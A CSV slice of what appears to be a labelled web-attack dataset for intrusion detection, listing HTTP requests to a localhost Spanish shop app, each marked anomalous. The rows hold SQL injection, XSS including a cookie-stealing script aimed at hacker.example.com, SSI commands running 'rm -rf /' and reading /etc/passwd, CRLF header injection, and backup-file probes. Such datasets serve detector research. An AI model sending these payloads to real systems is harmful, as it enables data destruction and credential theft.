,request,label
2095,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&login=chaar&pwd=pe4ibl171o&remember=on&b1=entrar,1
2096,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=@40,1
2097,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego';waitfor+delay+'0:0:15';--&precio=100&cantidad=28&b1=a�adir+al+carrito,1
2098,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=guendole&password=picoteado&nombre=calixta&apellidos=bergu�o+franceschini&email=mullican_oliver@@sayuela.sa&dni=37147257a&direccion=cronista+ildefonso+rodriguez+103+&ciudad=ispaster&cp=24322&provincia=zaragoza&ntc=3071106416830045&b1=registrar,1
2099,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=matsuzak&password=de82g�gic8&nombre=hayd�e&apellidos=arrotcharen+doniz&email=kontou@15horas.wf&dni=06384093y&direccion=calle+crucero-bouzas,+185,+&ciudad=leaburu&cp=32730&provincia=teruel&ntc=0473794196460600&b1=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org",1
2100,puthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=66&b1=a�adir+al+carrito,1
2101,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chonchan&pwd=zarce�o&remember=off&b1=set-cookie%3a+tamper%3d1041264011025374727,1
2102,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tejani&password=arable&nombre=josiana&apellidos=de+anta+colondres&email=agunda-wulff@onoratoinformatica.aq&dni=427'8643'&direccion=c/+jose+zamoray,+s/n+4c&ciudad=narros+del+puerto&cp=23770&provincia=tarragona&ntc=2400850921681991&b1=registrar",1
2103,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=adriene&password=ch28uel2&nombre=magina&apellidos=cabrales+poca&email=thornbury@erasmusrooms.name&dni=71625075q&direccion=carretera+antiga+d'horta+a+cerdanyola,+41,+10?f&ciudad=cistierna&cp=24439&provincia=hues./ca&ntc=9326795669017614&b1=registrar",1
2104,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2105,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=swick&password=recalzar&nombre=amiel&apellidos=del+blanco&email=ying-carridine@audiosat.sy&dni=55739537a&direccion=jose+cadierno+186,+6f&ciudad=nu�valos&cp=37621&provincia=asturias<!--#include+file=""archivo_secreto""+-->&ntc=2320151892972616&b1=registrar",1
2106,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=?,1
2107,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2108,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
2109,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
2110,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2111,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
2112,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
2113,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2114,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoany%3f%0aset-cookie%3a+tamper%3d5765205567234876235,1
2115,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
2116,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mayi&password=r75ar&nombre=alenka&apellidos=cejas+torra&email=kobe@techdata.com.pg&dni=75925253e&direccion='injected_param&ciudad=torres+de+cotillas,+las&cp=08731&provincia=navarra&ntc=1803474685764017&b1=registrar",1
2117,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carmelin&password=ci9cue7t6�al&nombre=/liliana&apellidos=morgadas&email=mondini@goscan.io&dni=81743896x&direccion=pantano+de+la+sotonera,+145+&ciudad=ahigal+de+los+aceiteros&cp=26526&provincia=tarragona&ntc=0742459903329031&b1=registrar",1
2118,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=woins?ky&pwd=pagadera&remember=off&b1=entrar,1
2119,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2120,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lynelle&password=lazada&nombre=simei&apellidos=cam�+tordera&email=bjerg.sevillano@@mc@gt.@gs&dni=37903163z&direccion=poligono+cortijo+real+169,+&ciudad=leda�a&cp=31263&provincia=segovia&ntc=1351127649843855&b1=registrar",1
2121,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4344&b1=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%,1
2122,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mobley&pwd=esc1lo6-i1&remembera=off&b1=entrar,1
2123,"gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas<!--#exec+cmd=""ls+/""-->",1
2124,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
2125,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1bob@<script>alert(paros)</script>.parosproxy.org,1
2126,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=6536&b1=confirmar,1
2127,gethttp://localhost:8080/tienda1/imagenes/3.gif~,1
2128,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jasmine&pwd=832t0484as&remember=off&b1a=entrar,1
2129,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwda=3o?964i7a1&remember=on&b1=entrar,1
2130,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=39&cantidada=52&b1=a�adir+al+carrito,1
2131,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2132,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=100&cantidad=6&b1=a�adir+al+carrito,1
2133,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2134,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dincamps&pwd=8/ast2tano&remember=off&b1=entrar,1
2135,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=?,1
2136,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
2137,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jiann&password=freno&nombre=raifroid&apellidos=sol�+portillo&email=nererova@camilafansite.by&dni=41955080k&direccion=c/+fusta+40+11-f&ciudad=san+pablo+de+los+montes&cpa=49333&provincia=burgos&ntc=5510588122545598&b1=registrar,1
2138,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goei&passworda=solemnemente&nombre=juvencio&apellidos=sebastan+bastida&email=luu-tupou@eddydaniele.bj&dni=77050984h&direccion=avinguda+lluis+companys,+144+3-d&ciudad=mu�osancho&cp=37871&provincia=valencia&ntc=4809346017466536&b1=registrar",1
2139,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=5565&b1=confirmar,1
2140,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=manou&password=desa32e1ito83&nombre=gyana&apellidos=i,labaca&email=mckinnon_bondi@mytanga.pm&dni=40316256q&direccion=alta+de+san+mateo,+71+&ciudad=maj�n&cp=12230&provincia=cuenca&ntc=3974578373052924&b1=registrar",1
2141,gethttp://localhost:8080/ibmwebas,1
2142,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2143,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=bob@<script>alert(paros)</script>.parosproxy.org&precio=2794&b1=confirmar,1
2144,gethttp://localhost:8080/iissamples/sdk/asp/database/simplequery_vbscript.asp,1
2145,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
2146,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=7427&b1=pasar+por+caja,1
2147,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif/4861362529278789730,1
2148,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chi-yin&password=zafio&nombre=amael&apellidos=casselle+cullell&email=vacey@madrid2012.kw&dni=70541156h&direccion=plza.+agueda+diez,+25+10?b|&ciudad=oria&cp=19415&provincia=cantabria&ntc=0891865623205844&b1=registrar",1
2149,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9014&b1=pasar+por+caja/,1
2150,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hofstett&password=furtivo&nombre=bartolomea&apellidos=villal�n&email=horeth@twinjet.al&dni=19895681z&direccion=santa+maria+de+mazzarello+185,+&ciudad=caba�as+de+la+sagra&cp=17770&provincia=tarragona&ntca=4479205024871909&b1=registrar",1
2151,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=couse&password=remanoso&nombre=viviana&apellidos=guimera+faraco&emaila=andre@alfombra.com.me&dni=13758311x&direccion=calle+la+fuente,+59,+13?b&ciudad=algadefe&cp=46910&provincia=burgos&ntc=5183768775927993&b1=registrar",1
2152,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lac&pwd=pin90&remember=off&b1=entrar%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e,1
2153,gethttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=vino+rioja&precio=85&cantidad=84&b1=a�adir+al+carrito,1
2154,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1<!--#exec+cmd=""ls+/""-->",1
2155,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2156,"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=','0','0');waitfor+delay+'0:0:15';--&precio=2158&b1=pasar+por+caja",1
2157,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rahn&pwd=28sca5�7&remember=on/&b1=entrar,1
2158,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%00,1
2159,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1202&b1=pasar+por+caja/,1
2160,gethttp://localhost:8080/tienda1/publico/registro.jsp.java,1
2161,"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=<!--#exec+cmd=""ls+/""-->&cantidad=86&b1=a�adir+al+carrito",1
2162,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rff&pwd=acordonada&remember=on&b1a=entrar,1
2163,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=daesik2&password=','0');waitfor+delay+'0:0:15';--&nombre=panciano&apellidos=bonitto+ciraco&email=dorsay.thursby@elrincondelmarmol.pr&dni=51834543h&direccion=cabo+de+agua,+s/n+&ciudad=villafranca+de+los+barros&cp=21240&provincia=ja�n&ntc=8319637256237029&b1=registrar",1
2164,"gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas','0');waitfor+delay+'0:0:15';--",1
2165,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2166,gethttp://localhost:8080/certsrv.nsf,1
2167,gethttp://localhost:8080/tienda1/imagenes/2.gif/asf-logo-wide.gif.inc,1
2168,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=prissie&password=7u3eo&nombre=marcelino&apellidos=gispert&email=moriaty.suchima@vendomiatico.atany%0d%0aset-cookie%3a+tamper%3d5765205567234876235&dni=76973319r&direccion=carrer+puigterra+de+dalt,+69,+&ciudad=alcal�+del+j�car&cp=34477&provincia=girona&ntc=5196721943648454&b1=registrar",1
2169,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1'injected_param,1
2170,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
2171,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=maijala&pwd=indiv!idualmente%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&remember=on&b1=entrar,1
2172,gethttp://localhost:8080/exampleswebapp/sessionservlet,1
2173,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=','0','0','0');waitfor+delay+'0:0:15';--&nombre=queso+manchego&precio=100&cantidad=22&b1=a�adir+al+carrito",1
2174,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito');waitfor+delay+'0:0:15';--,1
2175,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8192&b1=confirmar/,1
2176,gethttp://localhost:8080/tienda1/6909030637832563290.jsp,1
2177,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=|&password=40fi6eres5a&nombre=salustiano&apellidos=elguezabal+brot�&email=magarill@beljos.gi&dni=51095089z&direccion=zurbaran,+54,+&ciudad=f�rez&cp=10613&provincia=salamanca&ntc=8908099424894248&b1=registrar",1
2178,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=46&b1=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
2179,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fleurima&password=sa924a9u25&nombre=ladislada&apellidos=aregall+picabea&email=ursitti@nightflight.dm&dni=88865484q&direccion=merced,+63+&ciudad=valdemierque&cp=08784&provincia=s/alaman+c.a&ntc=5240985649337180&b1=registrar",1
2180,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=quan&password=l71o7o6�ne4&nombre=herm�nn&apellidos=estaragu�+cort�s&email=girls@viscotek.mh&dni=62336583m&direccion=paros%22%20style=%22background:url(javascript:alert('paros'))&ciudad=aras&cp=37727&provincia=granada&ntc=3043074301340407&b1=registrar,1
2181,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=krozser&password=975ctica&nombrea=her�n&apellidos=mogrovejo+garibaldi&email=nitschke@barcafedaniss.tr&dni=46288707b&direccion=calle+cartagena,+122+10?d&ciudad=mu��os&cp=12414&provincia=lleida&ntc=0281286910316978&b1=registrar",1
2182,gethttp://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide.gif/.bak,1
2183,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
2184,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
2185,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
2186,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2187,gethttp://localhost:8080/tienda1~,1
2188,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dombrosk&password=velu!dillo&nombre=quincio&apellidos=rezabal&email=omiya_bogetti@casablancabeach.gob&dni=77720635r&direccion=calle+arrozal+110,+3?g&ciudad=artesa+de+segre&cp=16336&provincia=castell�nany%0aset-cookie%3a+tamper%3d1041264011025374727&ntc=4597794127827518&b1=registrar",1
2189,"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=""+and+""1""=""1",1
2190,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bassigna&pwd=recercar&remember=on&b1a=entrar,1
2191,gethttp://localhost:8080/tienda1/imagenes/3.gif.bak,1
2192,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1'injected_param,1
2193,"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito','0','0','0','0');waitfor+delay+'0:0:15';--",1
2194,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rennolds&pwd=m4de0ar&remembera=on&b1=entrar,1
2195,gethttp://localhost:8080/iissamples/sdk/asp/database/limitrows_vbscript.asp,1
2196,gethttp://localhost:8080/_vti_bin/fpcount.exe,1
2197,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2198,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=balwinde&pwd=p'14pa514/i1/o&remember=off&b1=entrar,1
2199,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2200,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thyagara&password=fuerte&nombre=sol&apellidosa=gorgone+oteo&email=tissier@b-sign.cg&dni=03028605b&direccion=calle+alboran+39,+&ciudad=millanes&cp=49731&provincia=tarragona&ntc=4096797311989091&b1=registrar",1
2201,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modoa=registro&login=ochman&password=d5j8dero&nombre=erico&apellidos=buscart&email=flavin@opel-e-flex.kr&dni=20589158h&direccion=passatge+far,+90+8?e&ciudad=santib��ez+del+val&cp=46330&provincia=lleida&ntc=4447259758279371&b1=registrar",1
2202,gethttp://localhost:8080/tienda1/miembros/asf-logo-wide.gif/~,1
2203,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasany%0aset-cookie%3a+tamper%3d1041264011025374727,1
2204,gethttp://localhost:8080/tienda1/4861362529278789730,1
2205,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&nombre=vino+rioja&precio=100&cantidad=56&b1=a�adir+al+carrito",1
2206,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=%2b,1
2207,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasand+1=1,1
2208,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gavens0&password=revirado&nombre=kaya&apellidos=mojeda+batet&email=munshin@cirugiaplasticacordoba.hk&dni=65532112y&direccion=plaza+flauta+16,+1?b&ciudad=valdeavellano+de+tera&cp=<!--#exec+cmd=""ls+/""-->&provincia=teruel&ntc=2452355001922764&b1=registrar",1
2209,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boeck&password=atelaje&nombre=ina&apellidos=de+agreda+bellmunt&email=quester@expozaragozafloral2014.gq&dni=87110948n&direccion=calle+atletico+de+madrid,+62+6-c&ciudad=valdesamario&cp=21891&provinciaa=segovia&ntc=0738940592435694&b1=registrar",1
2210,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=|,1
2211,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=crigger&pwd=acribadora&remember=','0','0');waitfor+delay+'0:0:15';--&b1=entrar",1
2212,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mellisen&password=atacado&nombre=sacha&apellidos=guizasola+curiel&email=templey@sgi-sl.ps&dni=49723912m&direccion=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&ciudad=canal+de+berd�n&cp=25125&provincia=zamora&ntc=6206165534393585&b1=registrar,1
2213,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=swick&password=recalzar&nombre=amiel&apellidos=del+blanco&email=ying-carridine@audiosat.sy&dni=55739537a&direccion=jose+cadierno+186,+6f&ciudad=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&cp=37621&provincia=asturias&ntc=2320151892972616&b1=registrar",1
2214,gethttp://localhost:8080/wliconsole,1
2215,gethttp://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif/.old,1
2216,gethttp://localhost:8080/tienda1/publico/miembros.jsp/.bak,1
2217,gethttp://localhost:8080/iissamples/sdk/asp/database/storedprocedures_vbscript.asp,1
2218,gethttp://localhost:8080/tienda1/imagenes.old,1
2219,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=auton&pwda=gubi9&remember=on&b1=entrar,1
2220,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2221,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1692&b1=confirmar/,1
2222,gethttp://localhost:8080.bak,1
2223,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modoa=registro&login=cash3&password=desfacci�n&nombre=eraldo&apellidos=varela+pulido&email=salminen_chew@suardistec.tw&dni=16864786j&direccion=c/+chalaneros,+188,+12-e&ciudad=junta+de+villalba+de+losa&cp=08787&provincia=guadalajara&ntc=4545565224454291&b1=registrar",1
2224,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yigal&password=anf6_9ti�4915&nombre=sharim&apellidos=grino+crosas&email=santacroce_prueckner@puravidasa.bn&dni=68875056s&direccion=c/+padre+presentat,+26+&ciudada=torremanzanas/torre+de+les+ma�anes,+la&cp=31750&provincia=�vila&ntc=7191364141648176&b1=registrar",1
2225,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=keene-mo&password=des2l0bear&nombre=florio&apellidos=alcalde+rybensky&email=bobenko-steimaroua@926.lb&dni=65834957x&direccion=c/+leganes,+74+bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&ciudad=sant+miquel+de+campmajor&cp=42138&provincia=huesca&ntc=7967092459392219&b1=registrar",1
2226,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rici&password=aguiscar&nombre=c�stulo&apellidos=errante+bov�&email=porokhovschikov@placeresadultos.st&dni=50383140f&direccion=calle+de+san+lorenzo+88,+4?e&ciudad=bocairent&cp=32780&provincia=c�ceres&ntc=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&b1=registrar",1
2227,gethttp://localhost:8080/cfide/administrator/login.cfm,1
2228,gethttp://localhost:8080/postinfo.html,1
2229,gethttp://localhost:8080/iissamples/sdk/asp/database/storedprocedures_vbscript.asp,1
2230,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=charko&password=entrevenimiento&nombre=cayetano&apellidos=papiol+garriga&email=ruehmann.goodrow@cajucar.bz&dni=75246757a&direccion=calle+ferrer+i+guard*i*a,+7*+&ciudad=villa+de+ves&cp=09343&provincia=guadalajara&ntc=1828745224462815&b1=registrar",1
2231,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=6858&b1=confirmar,1
2232,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jeanloui&password=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&nombre=evelio&apellidos=fonfria+castillero&email=sprerris-apfel@tresbrujas.bn&dni=89061921x&direccion=c/+cervantes+117,+10?g&ciudad=�rbel+del+castillo&cp=50343&provincia=palencia&ntc=9895940721818753&b1=registrar",1
2233,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=poliwoda&password=enigmatista&nombre=tarciano&apellidos=cam�+tordera&email=nardo@codwatw.lk&dni=08762650h&direccion=federico+landrove+moi�o+105+3-g&ciudad=burlada/b.urlata&cp=19360&provincia=alicante&ntc=7171983347621063&b1=registrar,1
2234,gethttp://localhost:8080/tienda1/publico/vaciar.jsp.inc,1
2235,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=56&b1=+,1
2236,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=@40,1
2237,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=queso+manchego&precio=39&cantidad=21&b1=a�adir+al+carrito,1
2238,gethttp://localhost:8080/tienda1/global/menum.jsp/4861362529278789730,1
2239,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jing&password=decesora&nombre=carhu�&apellidos=menera+casquete&email=laure@permutatucasa.td&dni=69198356g&direccion=calle+line+ro+s,+14+1+-b&ciudad=bargas&cp=25236&provincia=valencia&ntc=5348568064095524&b1=registrar",1
2240,gethttp://localhost:8080/tienda1/miembros/asf-logo-wide.bak,1
2241,gethttp://localhost:8080/tienda1/publico/anadir.jsp/4861362529278789730,1
2242,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eldin&password=b9r4enillo&nombre=rogelio&apellidos=ingla+gu-ti�r-_rez&email=rehkopf_sell@zarahealth.cy&dni=31415477f&direccion=c/+el+greco+98,+&ciudad=ll�ria&cp=34259&provincia=toledo&ntc=1530250570237050&b1=registrar",1
2243,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=?,1
2244,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg='or'a='a,1
2245,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2246,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2247,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=suxin&password=testificaci�n&nombre=brisa&apellidos=corado+bon�as&email=mrkvicka@tvup.au&dni=27353775j&direccion=rio+pisue�a,+164,+12a&ciudad=caudiel&cp=17220&provincia=guadalajara&ntc=1754652645493707&b1a=registrar",1
2248,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
2249,gethttp://localhost:8080/iissamples/sdk/asp/database/update_vbscript.asp,1
2250,gethttp://localhost:8080/tienda1.old,1
2251,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gallard&password=c36ba&nombre=federica&apellidos=corb�+pichunman&email=pankin@muevetuweb.mobi&dni=49680817n%00&direccion=calle+zapateria+vieja+71+8d&ciudad=romanillos+de+atienza&cp=03579&provincia=tarragona&ntc=2469234767327968&b1=registrar,1
2252,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=*corn'eliu&pwd=deshiladiz&remember=off&b1=entrar,1
2253,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=100/&cantidad=47&b1=a�adir+al+carrito,1
2254,gethttp://localhost:8080/servlet/errorreporter,1
2255,gethttp://localhost:8080/tienda1/global.old,1
2256,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2257,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2|,1
2258,gethttp://localhost:8080/tienda1/publico/,1
2259,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
2260,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2,1
2261,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+.*?rioja&precio=85&cantidad=22&b1=a�adir+al+carrito,1
2262,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bienek&pwd=memoriosaany%3f%0aset-cookie%3a+tamper%3d5765205567234876235&remember=off&b1=entrar,1
2263,gethttp://localhost:8080/tienda1/global~,1
2264,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mitsui&password=d2s3o1nil2ar&nombre=tea&apellidos=cabrera+noguera&email=holzer-hammersley4@discon.in&dni=7645b6096bw&direccion=guadamacil,+198,+&ciudad=torrejoncillo&cp=08779&provincia=teruel&ntc=4706372444418662&b1=registrar",1
2265,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->",1
